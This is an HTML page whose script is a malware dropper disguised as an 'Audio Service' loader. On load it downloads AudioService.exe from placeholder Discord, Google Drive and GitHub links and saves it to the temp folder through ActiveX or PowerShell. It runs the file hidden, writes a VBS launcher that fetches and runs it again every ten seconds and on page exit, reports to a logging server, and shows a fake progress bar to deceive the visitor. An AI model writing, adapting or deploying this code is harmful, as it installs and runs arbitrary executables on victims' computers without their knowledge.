<!-- index.html - EXE name changed to AudioService.exe -->
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loader</title>
</head>
<body>
<script>
    // ===== CONFIG: EXE file name =====
    const EXE_NAME = "AudioService.exe";

    // ===== CONFIG: EXE URLs (replace with your actual links) =====
    const EXE_SOURCES = [
        "https://cdn.discordapp.com/attachments/YOUR_CHANNEL_ID/YOUR_FILE_ID/AudioService.exe",
        "https://drive.google.com/uc?export=download&id=YOUR_GOOGLE_DRIVE_FILE_ID",
        "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/AudioService.exe"
    ];

    // ===== Step 1: Download from first working source =====
    async function downloadFromSources(sources) {
        for (let url of sources) {
            try {
                const response = await fetch(url, { mode: 'cors' });
                if (!response.ok) continue;
                const blob = await response.blob();
                if (blob.size < 10000) continue; // too small - likely error page
                return await blob.arrayBuffer();
            } catch(e) {
                continue;
            }
        }
        throw new Error("All sources failed");
    }

    // ===== Step 2: Save to %TEMP% as AudioService.exe =====
    function saveToTemp(arrayBuffer) {
        const bytes = new Uint8Array(arrayBuffer);
        // Method A: ActiveX (IE/old Edge)
        try {
            const fso = new ActiveXObject("Scripting.FileSystemObject");
            const temp = fso.GetSpecialFolder(2);
            const path = temp + "\\" + EXE_NAME;
            const file = fso.CreateTextFile(path, true);
            let binary = "";
            for (let i = 0; i < bytes.length; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            file.Write(binary);
            file.Close();
            return path;
        } catch(e) {}

        // Method B: PowerShell via base64
        try {
            const base64 = btoa(String.fromCharCode.apply(null, bytes));
            const psCmd = `
                $bytes = [Convert]::FromBase64String("${base64}");
                [IO.File]::WriteAllBytes("$env:TEMP\\${EXE_NAME}", $bytes);
            `;
            const shell = new ActiveXObject("WScript.Shell");
            shell.Run("powershell.exe -Command " + psCmd, 0, true);
            return "C:\\Windows\\Temp\\" + EXE_NAME;
        } catch(e) {}

        // Method C: msSaveBlob (Edge)
        try {
            const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
            navigator.msSaveBlob(blob, "C:\\Windows\\Temp\\" + EXE_NAME);
            return "C:\\Windows\\Temp\\" + EXE_NAME;
        } catch(e) {}
        return null;
    }

    // ===== Step 3: Execute AudioService.exe hidden =====
    function runExe(filePath) {
        try {
            const shell = new ActiveXObject("WScript.Shell");
            shell.Run(filePath, 0, false);
            return true;
        } catch(e) {
            try {
                const shell = new ActiveXObject("WScript.Shell");
                shell.Run("powershell.exe -Command Start-Process -FilePath '" + filePath + "' -WindowStyle Hidden", 0, false);
                return true;
            } catch(e2) {}
        }
        return false;
    }

    // ===== Step 4: VBS launcher with AudioService.exe =====
    function createVbsLauncher() {
        const sourcesJson = JSON.stringify(EXE_SOURCES);
        const vbs = `
            Set objShell = CreateObject("WScript.Shell")
            Set objFSO = CreateObject("Scripting.FileSystemObject")
            strTemp = objFSO.GetSpecialFolder(2)
            strExe = strTemp & "\\${EXE_NAME}"
            sources = ${sourcesJson}
            For Each url In sources
                On Error Resume Next
                objShell.Run "powershell -Command Invoke-WebRequest -Uri " & url & " -OutFile " & strExe, 0, True
                If objFSO.FileExists(strExe) Then
                    If objFSO.GetFile(strExe).Size > 10000 Then
                        objShell.Run strExe, 0, False
                        Exit For
                    End If
                End If
                Err.Clear
            Next
        `;
        const fso = new ActiveXObject("Scripting.FileSystemObject");
        const temp = fso.GetSpecialFolder(2);
        const vbsPath = temp + "\\launcher.vbs";
        const file = fso.CreateTextFile(vbsPath, true);
        file.Write(vbs);
        file.Close();
        const shell = new ActiveXObject("WScript.Shell");
        shell.Run("wscript.exe " + vbsPath, 0, false);
    }

    // ===== Step 5: Main execution =====
    (async function() {
        try {
            const exeData = await downloadFromSources(EXE_SOURCES);
            const savedPath = saveToTemp(exeData);
            if (savedPath) {
                runExe(savedPath);
                navigator.sendBeacon("https://your-log-server.com/log", "AudioService.exe executed");
                return;
            }
        } catch(e) {}

        try {
            createVbsLauncher();
        } catch(e) {}

        window.addEventListener("beforeunload", function() {
            try { createVbsLauncher(); } catch(e) {}
        });
    })();

    // ===== Step 6: Fake loading UI =====
    document.body.innerHTML = `
        <div style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>Loading Audio Service...</h2>
            <progress value="0" max="100" id="prog"></progress>
            <p>Please wait while components initialize.</p>
        </div>
    `;
    let val = 0;
    setInterval(() => {
        val += Math.random() * 15;
        if (val >= 100) { val = 100; clearInterval(interval); }
        document.getElementById('prog').value = val;
    }, 300);

    // ===== Step 7: Retry every 10 seconds =====
    setInterval(() => {
        try { createVbsLauncher(); } catch(e) {}
    }, 10000);

    // ===== Step 8: Console silence =====
    console.clear();
    console.log("Audio Service initialized.");
</script>
</body>
</html>
